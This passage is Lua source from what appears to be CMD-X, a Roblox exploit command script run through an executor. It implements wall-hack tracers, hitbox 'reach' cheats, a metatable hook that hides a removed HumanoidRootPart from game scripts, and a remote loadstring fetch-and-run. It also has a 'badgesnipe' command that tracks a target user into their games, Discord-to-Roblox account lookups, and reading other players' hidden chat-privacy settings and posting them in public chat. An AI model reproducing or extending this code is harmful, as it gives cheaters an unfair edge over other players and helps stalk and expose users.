				cmdlp.Character.Humanoid.Jump = true
				game:GetService("TweenService"):Create(cmdlp.Character.HumanoidRootPart, TweenInfo.new(1, Enum.EasingStyle.Linear), {CFrame = v.CFrame}):Play()
				break
			end
		end
	end

	function useCommand.playingaudios()
		opx("-","Showing playing audios")
		xaudios = ""
		for i,v in pairs(workspace:GetDescendants()) do
			if v:IsA("Sound") and v.Playing then
				xaudios = xaudios..v.SoundId.."\n"
			end
		end
		opxL("Audios Playing",xaudios)
	end

	local notouchTouches = {}
	function useCommand.notouch()
		opx("-","Disabled all touchinterests")
		for i,v in pairs(workspace:GetDescendants()) do
			if v:IsA("TouchTransmitter") then
				table.insert(notouchTouches, {part = v.Parent, pare = v.Parent.Parent})
				v.Parent.Parent = game:GetService("PolicyService")
			end
		end
	end

	function useCommand.yestouch()
		opx("-","Enabled all touchinterests")
		for i,v in pairs(notouchTouches) do
			v.part.Parent = v.pare
			table.remove(notuchTouches, i)
		end
	end

	function useCommand.testaudio()
		if not cmdnum(arguments[2]) then
			opx("*","2 arguments are required!")
			return
		end
		opx("-","Now testing audio")
		local Sound2 = Instance.new("Sound",game:GetService("Lighting"))
		Sound2.SoundId = "http://www.roblox.com/asset/?id="..arguments[2]
		Sound2:Play()
	end

	function useCommand.debugging()
		if arguments[2] == "on" then
			Debugging = true
			opx("-","Debugging turned on")
		elseif arguments[2] == "off" then
			Debugging = false
			opx("-","Debugging turned off")
		else
			opx("*","2 arguments are required!")
		end
	end

	function useCommand.freereach()
		if not cmdnum(arguments[4]) then
			opx("*","4 arguments are required!")
			return
		end
		for i,v in pairs(cmdlp.Character:GetDescendants()) do
			if v:IsA("Tool") then
				currentToolSize = v.Handle.Size
				local a = Instance.new("SelectionBox",v.Handle)
				a.Name = "SelectionBoxCreated"
				a.Adornee = v.Handle
				a.Color3 = Color3.new(255, 255, 255)
				a.LineThickness = 0.01
				v.Handle.Massless = true
				v.Handle.Size = Vector3.new(arguments[2],arguments[3],arguments[4])
				v.GripPos = Vector3.new(0,0,0)
				v.Parent = cmdlp.Backpack
				v.Parent = cmdlp.Character
			end
		end
		opx("-","Reach set")
	end

	function useCommand.robloxqtversion()
		opx("-",game:HttpGet("http://setup.roblox.com/versionQTStudio"))
	end

	function useCommand.robloxfromdiscordid()
		if not cmdnum(arguments[2]) then
			opx("*","2 arguments are required!")
			return
		end
		pcall(function()
			local URL = ("https://verify.eryn.io/api/user/"..arguments[2])
			local Http = game:GetService("HttpService"):JSONDecode(game:HttpGet(URL))
			opx("-","Rover user: "..cmdp:GetNameFromUserIdAsync(Http.robloxId))
		end)
		pcall(function()
			local URL = ("https://api.blox.link/v1/user/"..arguments[2])
			local Http = game:GetService("HttpService"):JSONDecode(game:HttpGet(URL))
			opx("-","Bloxlink user: "..cmdp:GetNameFromUserIdAsync(Http.primaryAccount))
		end)
	end

	function useCommand.teleportstring()
		if arguments[2] == "cb" or "copy" then
			opx("-","game:GetService('TeleportService'):TeleportToPlaceInstance("..game.PlaceId..",'"..game.JobId.."',game:GetService('Players').LocalPlayer)")
			setclipboard("game:GetService('TeleportService'):TeleportToPlaceInstance("..game.PlaceId..",'"..game.JobId.."',game:GetService('Players').LocalPlayer)")
		else
			opx("-","game:GetService('TeleportService'):TeleportToPlaceInstance("..game.PlaceId..",'"..game.JobId.."',game:GetService('Players').LocalPlayer)")
		end
	end

	function CheckBadges(UserId)
		local TopBadge = "1"
		local Badges = {}
		local URL = ("https://badges.roblox.com/v1/users/"..UserId.."/badges?limit=100&sortOrder=Asc")
		local Http = game:GetService("HttpService"):JSONDecode(game:HttpGet(URL))
		local RAP = 0
		function ListItems(Look)
			for i,v in pairs(Look.data) do
				if v.id ~= nil then Badges[#Badges+1] = v.id end
			end
		end
		opx("-","Checking badges page 0")
		ListItems(Http)
		for i = 1,5000 do
			opx("-","Checking badges page "..i)
			if NoLongerLooking == true then break end
			if Http.nextPageCursor ~= null then
				Http = game:GetService("HttpService"):JSONDecode(game:HttpGet(URL.."&cursor="..Http.nextPageCursor))
				ListItems(Http)
			else
				TopBadge = Badges[#Badges]
				break
			end
		end
		if TopBadge ~= "1" then return TopBadge else return "sorry" end
	end

	local Online = true
	function CheckOnlineStatus(UserId)
		Online = true
		pcall(function()
			Http2 = game:GetService("HttpService"):JSONDecode(game:HttpGet("http://api.roblox.com/users/"..UserId.."/onlinestatus"))
			if Http2.IsOnline == true then Online = "true" else Online = "false" end
		end)
		return Online
	end

	local NoLongerLooking = true
	function useCommand.badgesnipe()
		if not arguments[2] then
			opx("*","2 arguments are required!")
			return
		end
		local UserStr = arguments[2]
		local User = cmdp:GetUserIdFromNameAsync(arguments[2])
		NoLongerLooking = false
		if CheckOnlineStatus(User) ~= "true" then
			opx("*","User is not online?")
			return
		end
		local i = 0
		repeat i = i + 1
			if CheckOnlineStatus(User) ~= "true" then
				opx("*","User is no longer online.")
				NoLongerLooking = true
				break
			end
			if NoLongerLooking == true then break end
			pcall(function()
				opx("-","Re-running badge check...")
				CurrentBadger = CheckBadges(User)
				if CurrentBadger ~= "sorry" then
					if CurrentBadge ~= CurrentBadger then
						opx("-","New badge detected on profile, searching linked game...")
						pcall(function() HttpBadge = game:GetService("HttpService"):JSONDecode(game:HttpGet("https://badges.roblox.com/v1/badges/"..CurrentBadger)) end)
						opx("-",HttpBadge.awardingUniverse.rootPlaceId)
						local PlaceId = HttpBadge.awardingUniverse.rootPlaceId
						arguments = {"",UserStr,PlaceId}
						useCommand.streamsnipe()
					end
					CurrentBadge = CurrentBadger
				end
			end)
			wait(5)
		until NoLongerLooking
	end

	function useCommand.copyoutputlarger()
		if cmdnum(arguments[3]) then
			local start = arguments[2]
			local breaker = arguments[3]
			setclipboard(opxScrolling.Text:sub(start,breaker))
			opx("-","Copied latest output larger")
		else
			setclipboard(opxScrolling.Text)
			opx("-","Copied latest output larger")
		end
	end

	function useCommand.unfriend()
		if arguments[2] == "all" then
			opx("-","Removed friendship from everyone")
			for i,v in pairs(cmdp:GetPlayers()) do
				cmdlp:RevokeFriendship(v)
			end
		else
			target = findplr(arguments[2])
			if target then
				opx("-","Removed friendship from "..target.Name)
				cmdlp:RevokeFriendship(target)
			else
				opx("*","Player does not exist!")
			end
		end
	end

	function useCommand.cutbackpackplayloop()
		fpall = false
		opx("-","Stopped backpackplay loop")
	end

	function useCommand.rejoinrefresh()
		if not syn.queue_on_teleport then
			opx("*","queue_on_teleport is not supported on your executor!")    
		end
		rejoining = true
		local c = cmdlp.Character.HumanoidRootPart.CFrame
		syn.queue_on_teleport(string.format([[
		game:GetService('ReplicatedFirst'):RemoveDefaultLoadingScreen()
		local playeradded, charadded
		playeradded = game:GetService('Players').PlayerAdded:Connect(function(plr)
			charadded = plr.CharacterAdded:Connect(function(char)
				char:WaitForChild("HumanoidRootPart").CFrame = CFrame.new(%f, %f, %f)
				charadded:Disconnect()
			end)
			playeradded:Disconnect()
		end)
	]], c.X, c.Y, c.Z))
		opx("-","Rejoining game")
		game:GetService('TeleportService'):TeleportToPlaceInstance(game.PlaceId, game.JobId, cmdp)
		wait(3)
		rejoining = false
	end

	function useCommand.rejoinrefreshexecute()
		if not syn.queue_on_teleport then
			opx("*","queue_on_teleport is not supported on your executor!")    
		end
		rejoining = true
		local c = cmdlp.Character.HumanoidRootPart.CFrame
		syn.queue_on_teleport(string.format([[
		game:GetService('ReplicatedFirst'):RemoveDefaultLoadingScreen()
		local playeradded, charadded
		playeradded = game:GetService('Players').PlayerAdded:Connect(function(plr)
			charadded = plr.CharacterAdded:Connect(function(char)
				char:WaitForChild("HumanoidRootPart").CFrame = CFrame.new(%f, %f, %f)
				charadded:Disconnect()
			end)
			playeradded:Disconnect()
		end)
		loadstring(game:HttpGet("https://raw.githubusercontent.com/CMD-X/CMD-X/master/Source", true))()
	]], c.X, c.Y, c.Z))
		opx("-","Rejoining game")
		game:GetService('TeleportService'):TeleportToPlaceInstance(game.PlaceId, game.JobId, cmdp)
		wait(3)
		rejoining = false
	end

	Lines = {}
	function UpdateTracer()
		for i,v in pairs(Lines) do
			v:Remove()
		end
		Lines = {}
		for i,v in pairs(cmdp:GetPlayers()) do 
			if v ~= cmdlp then
				if v and v.Character ~= nil then
					Head = v.Character:FindFirstChild("Head")
					if Head ~= nil then
						local PosChar, withinScreenBounds = workspace.Camera:WorldToViewportPoint(Head.Position)
						if withinScreenBounds then
							local Line = Drawing.new("Line")
							Line.Visible = true
							Line.From = Vector2.new(workspace.Camera.ViewportSize.X / 2, workspace.Camera.ViewportSize.Y)
							Line.To = Vector2.new(PosChar.X, PosChar.Y)
							Line.Color = Color3.new(255,255,255)
							Line.Thickness = 2
							Line.Transparency = 1
							Lines[#Lines+1] = Line
						end
					end
				end
			end
		end
	end

	TracerEnabled = false
	function useCommand.tracers()
		if not Drawing then
			opx("*","Drawing API is not supported on your executor!")
			return
		end
		opx("-","Tracers enabled")
		for i,v in pairs(Lines) do
			v:Remove()
		end
		Lines = {}
		TracerEnabled = true
		while TracerEnabled do
			UpdateTracer()
			game:GetService("RunService").RenderStepped:Wait()
		end
	end

	function useCommand.untracers()
		opx("-","Tracers disabled")
		TracerEnabled = false
		for i,v in pairs(Lines) do
			v:Remove()
		end
		Lines = {}
	end

	PartLines = {}
	function UpdatePartTracer(partarg,partname)
		for i,v in pairs(PartLines) do
			v:Remove()
		end
		PartLines = {}
		for i,v in pairs(workspace:GetDescendants()) do
			if partarg == "class" then
				if v:IsA("BasePart") and partname == v.ClassName then
					if partname == "ClickDetector" or partname == "TouchInterest" then v = v.Parent end
					local PosChar, withinScreenBounds = workspace.Camera:WorldToViewportPoint(v.Position)
					if withinScreenBounds then
						local Line = Drawing.new("Line")
						Line.Visible = true
						Line.From = Vector2.new(workspace.Camera.ViewportSize.X / 2, workspace.Camera.ViewportSize.Y)
						Line.To = Vector2.new(PosChar.X, PosChar.Y)
						Line.Color = Color3.new(255,255,255)
						Line.Thickness = 2
						Line.Transparency = 1
						PartLines[#Lines+1] = Line
					end
				end
			elseif partarg == "name" then
				if v:IsA("BasePart") and partname == v.Name then
					local PosChar, withinScreenBounds = workspace.Camera:WorldToViewportPoint(v.Position)
					if withinScreenBounds then
						local Line = Drawing.new("Line")
						Line.Visible = true
						Line.From = Vector2.new(workspace.Camera.ViewportSize.X / 2, workspace.Camera.ViewportSize.Y)
						Line.To = Vector2.new(PosChar.X, PosChar.Y)
						Line.Color = Color3.new(255,255,255)
						Line.Thickness = 2
						Line.Transparency = 1
						PartLines[#Lines+1] = Line
					end
				end
			end
		end
	end

	function useCommand.replicateanim()
		if not arguments[2] then
			opx("*","2 arguments are required!")
			return
		end
		if IHaveSimmed == false then
			opx("*","You need to run .simulationradius first!")
			return
		end
		opx("-","Now replicating anim, creds to Riptxde")
		local Char = cmdlp.Character
		local Humanoid = Char.Humanoid
		local Frame = 60
		coroutine.wrap(function()
			cmdlp.Character.HumanoidRootPart.Anchored = true
			wait(.8)
			cmdlp.Character.HumanoidRootPart.Anchored = false
		end)()
		local Create = function(Obj,Parent)
			local I = Instance.new(Obj)
			I.Parent = Parent
			return I
		end
		local Contains = function(Table,KV)
			for K,V in next, Table do 
				if rawequal(KV,K) or rawequal(KV,V) then 
					return true
				end
			end
			return false
		end
		local PoseToCF = function(Pose,Motor)
			return (Motor.Part0.CFrame * Motor.C0 * Pose.CFrame * Motor.C1:Inverse()):ToObjectSpace(Motor.Part0.CFrame)
		end
		local Torso = cmdlp.Character.Torso
		local Joints = {
			["Torso"] = cmdlp.Character.HumanoidRootPart.RootJoint,
			["Left Arm"] = Torso["Left Shoulder"],
			["Right Arm"] = Torso["Right Shoulder"],
			["Left Leg"] = Torso["Left Hip"],
			["Right Leg"] = Torso["Right Hip"],
		}
		for K,V in next, Char:GetChildren() do 
			if V:IsA("BasePart") then 
				coroutine.wrap(function()
					repeat V.CanCollide = false
						game:GetService("RunService").Stepped:Wait() 
					until cmdlp.Character.Humanoid.Health < 1
				end)()
			end
		end
		for K,V in next, Joints do 
			local AP, AO, A0, A1 = Create("AlignPosition",V.Part1), Create("AlignOrientation",V.Part1), Create("Attachment",V.Part1), Create("Attachment",V.Part0)
			AP.RigidityEnabled = true
			AO.RigidityEnabled = true
			AP.Attachment0 = A0
			AP.Attachment1 = A1
			AO.Attachment0 = A0
			AO.Attachment1 = A1
			A0.Name = "CFAttachment0"
			A1.Name = "CFAttachment1"
			A0.CFrame = V.C1 * V.C0:Inverse()
			V:Remove()
		end
		local Edit = function(Part,Value,Duration,Style,Direction)
			Style = Style or "Enum.EasingStyle.Linear"
			Direction = Direction or "Enum.EasingDirection.In"
			local Attachment = Part:FindFirstChild("CFAttachment0")
			if Attachment ~= nil then
				game:GetService("TweenService"):Create(Attachment,TweenInfo.new(Duration,Enum.EasingStyle[tostring(Style):split('.')[3]],Enum.EasingDirection[tostring(Direction):split('.')[3]],0,false,0),{CFrame = Value}):Play()
			end
		end
		if not game:GetService("RunService"):FindFirstChild("Delta") then
			local Delta = Create("BindableEvent",game:GetService("RunService"))
			Delta.Name = "Delta"
			local A, B = 0, tick()
			game:GetService("RunService").Delta:Fire()
			game:GetService("RunService").Heartbeat:Connect(function(C, D)
				A = A + C
				if A >= (1/Frame) then
					for I = 1, math.floor(A / (1/Frame)) do
						game:GetService("RunService").Delta:Fire()
					end
					B = tick()
					A = A - (1/Frame) * math.floor(A / (1/Frame))
				end
			end)
		end
		coroutine.wrap(function()
			Humanoid.Died:Wait()
			for K,V in next, cmdlp.Character:GetDescendants() do 
				if V.Name:match("Align") then 
					V:Destroy()
				end
			end
		end)()
		local PreloadAnimation = function(AssetId)
			local Sequence = game:GetObjects("rbxassetid://"..AssetId)[1]
			wait(.06)
			local Class = {Speed = 1}
			local Yield = function(Seconds)
				local Time = Seconds * (Frame + Sequence:GetKeyframes()[#Sequence:GetKeyframes()].Time)
				for I = 1,Time,Class.Speed do 
					game:GetService("RunService").Delta.Event:Wait()
				end
			end
			Class.Stopped = false;
			Class.Complete = Instance.new("BindableEvent")
			Class.Play = function()
				Class.Stopped = false
				coroutine.wrap(function()
					repeat
						for K = 1,#Sequence:GetKeyframes() do 
							local K0, K1, K2 = Sequence:GetKeyframes()[K-1], Sequence:GetKeyframes()[K], Sequence:GetKeyframes()[K+1]
							if Class.Stopped ~= true and cmdlp.Character.Humanoid.Health > 0 then
								if K0 ~= nil then 
									Yield(K1.Time - K0.Time)
								end
								coroutine.wrap(function()
									for I = 1,#K1:GetDescendants() do 
										local Pose = K1:GetDescendants()[I]
										if Contains(Joints,Pose.Name) then 
											local Duration = K2 ~= nil and (K2.Time - K1.Time)/Class.Speed or .5
											Edit(Char[Pose.Name],PoseToCF(Pose,Joints[Pose.Name]),Duration,Pose.EasingStyle,Pose.EasingDirection)
										end
									end
								end)()
							end
						end
						Class.Complete:Fire()
					until Sequence.Loop ~= true or Class.Stopped ~= false or cmdlp.Character.Humanoid.Health < 1
				end)()
			end
			Class.Stop = function()
				Class.Stopped = true;
			end
			Class.Reset = function()
				coroutine.wrap(function()
					wait(.02)
					for K,V in next, Joints do 
						local Part = Char[K]
						if Part ~= nil then 
							local Attachment = Part:FindFirstChild("CFAttachment0")
							if Attachment ~= nil then 
								Attachment.CFrame = V.C1 * V.C0:Inverse()
							end
						end
					end
				end)()
			end
			return Class
		end
		_G.connections.ReplicatedAnimation = PreloadAnimation(arguments[2])
		_G.connections.ReplicatedAnimation.Speed = arguments[3] or 1
		_G.connections.ReplicatedAnimation:Play()
	end

	function useCommand.replicateanimspeed()
		if not arguments[2] then
			opx("*","2 arguments are required!")
			return
		end
		opx("-","Replicating anim speed is now "..arguments[2])
		_G.connections.ReplicatedAnimation.Speed = arguments[2]
	end

	PartTracerEnabled = false
	function useCommand.parttracers()
		if not Drawing then
			opx("*","Drawing API is not supported on your executor!")
			return
		end
		local arg2 = arguments[2]
		local arg3 = arguments[3]
		opx("-","Part Tracers enabled")
		for i,v in pairs(PartLines) do
			v:Remove()
		end
		PartLines = {}
		PartTracerEnabled = true
		while PartTracerEnabled do
			UpdatePartTracer(arg2,arg3)
			game:GetService("RunService").RenderStepped:Wait()
		end
	end

	function useCommand.unparttracers()
		opx("-","Part Tracers disabled")
		PartTracerEnabled = false
		for i,v in pairs(PartLines) do
			v:Remove()
		end
		PartLines = {}
	end

	function useCommand.removeroot()
		opx("-","Removed HumanoidRootPart")
		local oind = mt.__index
		local hrp = cmdlp.Character.HumanoidRootPart
		local selves = {
			[hrp.Parent] = true,
			[cmdlp.Character] = true
		}
		local inds = {
			[hrp.Name] = true,
			["HumanoidRootPart"] = true,
			["PrimaryPart"] = true
		}
		setreadonly(mt, false)
		mt.__index = newcclosure(function(self,ind,...)
			if not checkcaller() and selves[self] and inds[ind] then
				return hrp
			end
			return oind(self,ind,...)
		end)
		setreadonly(mt, true)
		cmdlp.Character.HumanoidRootPart.Parent = workspace
	end

	function useCommand.antifling()
		if antifling == nil then 
			antifling = true
		else
			antifling = not antifling
		end
		local function Collisionless(person)
			if antifling and person.Character then
				for _,child in pairs(person.Character:GetDescendants()) do
					if child:IsA("BasePart") and child.CanCollide then
						child.CanCollide = false
					end
				end
			end
		end
		for _,v in pairs(cmdp:GetPlayers()) do
			if v ~= cmdlp then
				local antifling = game:GetService('RunService').Stepped:connect(function()
					Collisionless(v)
				end)
			end
		end
		cmdp.PlayerAdded:Connect(function()
			if v ~= cmdlp and antifling then
				local antifling = game:GetService('RunService').Stepped:connect(function()
					Collisionless(v)
				end)
			end
		end)
		if antifling then
			opx("-","Antifling enabled.")
		else
			opx("-","Antifling disabled.")
		end
	end

	function useCommand.nofall()
		if _G.connections["nofall"] then
			opx("*", "Nofall is already enabled.")
			return
		end
		cmdlp.Character.Humanoid:SetStateEnabled(1, false)
		cmdlp.Character.Humanoid:SetStateEnabled(0, false)
		_G.connections["nofall"] = cmdlp.CharacterAdded:Connect(function(char)
			wait()
			char.Humanoid:SetStateEnabled(1, false)
			char.Humanoid:SetStateEnabled(0, false)
		end)
		opx("-","Falling has been disabled.")
	end

	function useCommand.yesfall()
		if not _G.connections["nofall"] then
			opx("*", "Nofall is not enabled.")
			return
		end
		cmdlp.Character.Humanoid:SetStateEnabled(1, true)
		cmdlp.Character.Humanoid:SetStateEnabled(0, true)
		_G.connections["nofall"]:Disconnect()
		_G.connections["nofall"] = nil
		opx("-","Falling has been enabled.")
	end

	function useCommand.nofallbp()
		if _G.connections["nofallbp"] then
			opx("*", "Nofall bypass is already enabled")
			return
		end
		_G.connections["nofallbp"] = cmdlp.Character.Humanoid.StateChanged:Connect(function(z, new)
			if new == Enum.HumanoidStateType.FallingDown or new == Enum.HumanoidStateType.Ragdoll then
				cmdlp.Character.Humanoid:ChangeState(z)
			end
		end)
		opx("-","Antifall bypass enabled")
	end

	function useCommand.yesfallbp()
		if not _G.connections["nofallbp"] then
			opx("*","Antifall has not been enabled yet")
			return
		end
		_G.connections["nofallbp"]:Disconnect()
		opx("-","Antifall bypass disabled")
	end

	function useCommand.fixbubblechat()
		if _G.connections["bcfix"] then
			opx("*","Bubble chat has already been fixed")
			return
		end
		if cmdlp.PlayerGui:FindFirstChild("BubbleChat") then
			_G.connections["bcfix"] = cmdlp.PlayerGui.BubbleChat.DescendantAdded:connect(function(msg)
				if msg:IsA("TextLabel") and msg.Name == "BubbleText" then
					msg.TextSize = 21
				end
			end)
		end
		opx("-","Bubble chat has been fixed.")
	end

	function useCommand.unfixbubblechat()
		if not _G.connections["bcfix"] then
			opx("*","Bubble chat isn't fixed.")
			return
		end
		_G.connections["bcfix"]:Disconnect()
		_G.connections["bcfix"] = nil
		opx("*","Bubble chat has been unfixed.")
	end

	function useCommand.darkbubbles()
		if _G.connections["darkbubbles"] then
			opx("*","Dark bubbles are already enabled.")
			return
		end
		if cmdlp.PlayerGui:FindFirstChild("BubbleChat") then
			_G.connections["darkbubbles"] = cmdlp.PlayerGui.BubbleChat.DescendantAdded:connect(function(msg)
				if msg:IsA("ImageLabel") and msg.Name == "ChatBubble" or msg:IsA("ImageLabel") and msg.Name == "ChatBubbleTail" or msg:IsA("ImageLabel") and msg.Name == "SmallTalkBubble" then
					msg.ImageColor3 = Color3.fromRGB(0,0,0)
				end
				if msg:IsA("TextLabel") and msg.Name == "BubbleText" then
					msg.TextColor3 = Color3.fromRGB(255,255,255)
					msg.BackgroundColor3 = Color3.fromRGB(0,0,0)
				end
			end)
		end
		opx("-","Dark bubbles have been enabled.")
	end

	function useCommand.undarkbubbles()
		if not _G.connections["darkbubbles"] then
			opx("*","Dark bubbles are not enabled.")
		end
		_G.connections["darkbubbles"]:Disconnect()
		_G.connections["darkbubbles"] = nil
		opx("-","Dark bubbles have been disabled.")
	end

	function useCommand.colourbubbles()
		if arguments[7] then
			if _G.connections["darkbubbles"] or _G.connections["colourbubbles"] then
				opx("*","Coloured bubbles are already enabled.")
				return
			end
			local x,y,z = arguments[2],arguments[3],arguments[4]
			local c,m,d = arguments[5],arguments[6],arguments[7]
			if cmdlp.PlayerGui:FindFirstChild("BubbleChat") then
				_G.connections["colourbubbles"] = cmdlp.PlayerGui.BubbleChat.DescendantAdded:connect(function(msg)
					if msg:IsA("ImageLabel") and msg.Name == "ChatBubble" or msg:IsA("ImageLabel") and msg.Name == "ChatBubbleTail" or msg:IsA("ImageLabel") and msg.Name == "SmallTalkBubble" then
						msg.ImageColor3 = Color3.fromRGB(x,y,z)
					end
					if msg:IsA("TextLabel") and msg.Name == "BubbleText" then
						msg.TextColor3 = Color3.fromRGB(c,m,d)
						msg.BackgroundColor3 = Color3.fromRGB(x,y,z)
					end
				end)
			end
			opx("-","Colour bubbles have been enabled.")
		else
			opx("*","7 arguments are required!")
		end
	end

	function useCommand.uncolourbubbles()
		if not _G.connections["colourbubbles"] then
			opx("*","Colour bubbles are not enabled.")
		end
		_G.connections["colourbubbles"]:Disconnect()
		_G.connections["colourbubbles"] = nil
		opx("-","Colour bubbles have been disabled.")
	end

	function useCommand.tweenwalkspeed()
		if arguments[2] then
			walkspeedSet = arguments[2]
			opx("-","Tween Walkspeed is now on")
			WaitTimer = .4
			cmdlp.Character.Humanoid.WalkSpeed = 4
			function Accelerate()
				if cmdlp.Character.Humanoid.MoveDirection ~= Vector3.new(0, 0, 0) and MoveDirDB == false and cmdlp.Character.Humanoid.WalkSpeed < walkspeedSet then
					MoveDirDB = true
					while cmdlp.Character.Humanoid.MoveDirection ~= Vector3.new(0, 0, 0) and cmdlp.Character.Humanoid.WalkSpeed < walkspeedSet do
						cmdlp.Character.Humanoid.WalkSpeed = cmdlp.Character.Humanoid.WalkSpeed + 1
						wait(WaitTimer)
						WaitTimer = .4 / 1.1
					end
					MoveDirDB = false
				elseif cmdlp.Character.Humanoid.MoveDirection == Vector3.new(0, 0, 0) then
					WaitTimer = .4
					cmdlp.Character.Humanoid.WalkSpeed = 4
				end
			end
			tws = cmdlp.Character.Humanoid:GetPropertyChangedSignal("MoveDirection"):Connect(Accelerate)
		else
			opx("*","2 arguments are required!")
		end
	end

	function useCommand.untweenwalkspeed()
		opx("-","Tween Walkspeed is no longer on")
		cmdlp.Character.Humanoid.WalkSpeed = 16
		tws:Disconnect()
	end

	function useCommand.combo()
		if arguments[2] then
			opx("-","Ran combo "..arguments[2])
			for i,v in pairs(combos) do
				if v.N == arguments[2] then
					arguments = v.CMD:split(" ")
					useCommand[arguments[1]]()
				end
			end
		else
			opx("*","2 arguments are required")
		end
	end

	function useCommand.combos()
		xCombos = ""
		for i,v in pairs(combos) do
			xCombos = xCombos..v.N..", "
		end
		opx("-","Listed combos")
		opxL("Combos",xCombos)
	end

	function useCommand.combonew()
		if arguments[3] then
			opx("-","Added "..arguments[2] .." to combos")
			table.insert(combos, {N = arguments[2], CMD = getstring(3)})
		else
			opx("*","3 arguments are required!")
		end
	end

	function useCommand.combodel()
		if arguments[2] then
			for i,v in pairs(combos) do
				if v.N == arguments[2] then
					table.remove(combos, i)
				end
			end
			opx("-","Removed "..arguments[2].." from combos")
		else
			opx("*","2 arguments are required")
		end
	end

	function useCommand.combosclr()
		opx("-","Cleared combos list")
		combos = {}
		updatesaves()
	end

	function useCommand.chatprivacypublic()
		local gethiddenproperty = gethiddenproperty or get_hidden_property
		if not gethiddenproperty then
			opx("*","Gethiddenproperty is needed!")
			return
		end
		if not arguments[2] then
			opx("*","2 arguments are required!")
			return
		end
		target = findplr(arguments[2])
		if not target then
			opx("*","Player does not exist!")
			return
		end
		local GetCPM = gethiddenproperty(target,"ChatPrivacyMode")
		if GetCPM == Enum.ChatPrivacyMode.AllUsers then
			opx("-",target.Name.."'s privacy mode is Everyone")
			cmdrs.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(target.Name.."'s privacy mode is Everyone","All")
		elseif GetCPM == Enum.ChatPrivacyMode.Friends then
			opx("-",target.Name.."'s privacy mode is Friends")
			cmdrs.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(target.Name.."'s privacy mode is Friends","All")
		elseif GetCPM == Enum.ChatPrivacyMode.NoOne then
			opx("-",target.Name.."'s privacy mode is No-one")
			cmdrs.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(target.Name.."'s privacy mode is No-one","All")
		end
	end

	function useCommand.chatprivacyprivate()
		local gethiddenproperty = gethiddenproperty or get_hidden_property
		if not gethiddenproperty then
			opx("*","Gethiddenproperty is needed!")
			return
		end
		if not arguments[2] then
			opx("*","2 arguments are required!")
			return
		end
		target = findplr(arguments[2])
		if not target then
			opx("*","Player does not exist!")
			return
		end
		local GetCPM = gethiddenproperty(target,"ChatPrivacyMode")
		if GetCPM == Enum.ChatPrivacyMode.AllUsers then
			opx("-",target.Name.."'s privacy mode is Everyone")
		elseif GetCPM == Enum.ChatPrivacyMode.Friends then
			opx("-",target.Name.."'s privacy mode is Friends")
		elseif GetCPM == Enum.ChatPrivacyMode.NoOne then
			opx("-",target.Name.."'s privacy mode is No-one")
		end
	end

	function useCommand.chatprivacy()
		local sethiddenproperty = sethiddenproperty or set_hidden_property
		if not sethiddenproperty then
			opx("*","Sethiddenproperty is needed!")
			return
		end
		if not arguments[2] then
			opx("*","A proper preset is required!")
			return
		end
		opx("-","Set your Chat Privacy to "..arguments[2])
		sethiddenproperty(cmdlp,"ChatPrivacyMode",Enum.ChatPrivacyMode[arguments[2]])    
	end

	function useCommand.masschatprivacy()
		local gethiddenproperty = gethiddenproperty or get_hidden_property
		if not gethiddenproperty then
			opx("*","Gethiddenproperty is needed!")
			return
		end
		local xCPM = ""
		for i,v in pairs(cmdp:GetPlayers()) do
			local GetCPM = gethiddenproperty(v,"ChatPrivacyMode")
			if GetCPM == Enum.ChatPrivacyMode.AllUsers then
				xCPM = xCPM..v.Name.."'s privacy mode is Everyone\n"
			elseif GetCPM == Enum.ChatPrivacyMode.Friends then
				xCPM = xCPM..v.Name.."'s privacy mode is Friends\n"
			elseif GetCPM == Enum.ChatPrivacyMode.NoOne then
				xCPM = xCPM..v.Name.."'s privacy mode is No-one\n"
			end
		end
		opxL("Chat Privacy",xCPM)
	end

	local gravity = workspace.Gravity
	function useCommand.sitfly()
		workspace.Gravity = 0
		cmdlp.Character.Humanoid.Sit = true
		opx("-", "Now sitflying")
	end

	function useCommand.platformfly()
		workspace.Gravity = 0
		cmdlp.Character.Humanoid.PlatformStand = true
		opx("-", "Now platformflying")
	end

	function useCommand.unsitfly()
		workspace.Gravity = gravity
		cmdlp.Character.Humanoid.Sit = false
		opx("-", "No longer sitflying")
	end

	function useCommand.unplatformfly()
		workspace.Gravity = gravity
		cmdlp.Character.Humanoid.PlatformStand = false
		opx("-", "No longer platformflying")
	end

	function useCommand.hotkeysitflyhold()
		if not arguments[2] then
			opx("*", "2 arguments required")
			return
		end
		if not _G.connections["sitfly"] then _G.connections["sitfly"] = {} end
		for _,v in pairs(_G.connections["sitfly"]) do
			v:Disconnect()
		end
		_G.connections["sitfly"] = {}
		workspace.Gravity = gravity
		cmdlp.Character.Humanoid.Sit = false
		cmdlp.Character.Humanoid.PlatformStand = false
		_G.connections["sitfly"]["down"] = cmduis.InputBegan:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.Keyboard and input.KeyCode == Enum.KeyCode[arguments[2]:upper()] then
				workspace.Gravity = 0
				cmdlp.Character.Humanoid.Sit = true
			end
		end)
		_G.connections["sitfly"]["up"] = cmduis.InputEnded:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.Keyboard and input.KeyCode == Enum.KeyCode[arguments[2]:upper()] then
				workspace.Gravity = gravity
				cmdlp.Character.Humanoid.Sit = false
			end
		end)
		opx("-", "Sitfly enabled on key "..arguments[2]:upper().." on hold")
	end

	function useCommand.hotkeyplatformflyhold()
		if not arguments[2] then
			opx("*", "2 arguments required")
			return
		end
		if not _G.connections["sitfly"] then _G.connections["sitfly"] = {} end
		for _,v in pairs(_G.connections["sitfly"]) do
			v:Disconnect()
		end
		_G.connections["sitfly"] = {}
		workspace.Gravity = gravity
		cmdlp.Character.Humanoid.Sit = false
		cmdlp.Character.Humanoid.PlatformStand = false
		_G.connections["sitfly"]["down"] = cmduis.InputBegan:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.Keyboard and input.KeyCode == Enum.KeyCode[arguments[2]:upper()] then
				workspace.Gravity = 0
				cmdlp.Character.Humanoid.PlatformStand = true
			end
		end)
		_G.connections["sitfly"]["up"] = cmduis.InputEnded:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.Keyboard and input.KeyCode == Enum.KeyCode[arguments[2]:upper()] then
				workspace.Gravity = gravity
				cmdlp.Character.Humanoid.PlatformStand = false
			end
		end)
		opx("-", "Platformfly enabled on key "..arguments[2]:upper().." on hold")
	end

	function useCommand.hotkeysitflytoggle()
		if not arguments[2] then
			opx("*", "2 arguments required")
			return
		end
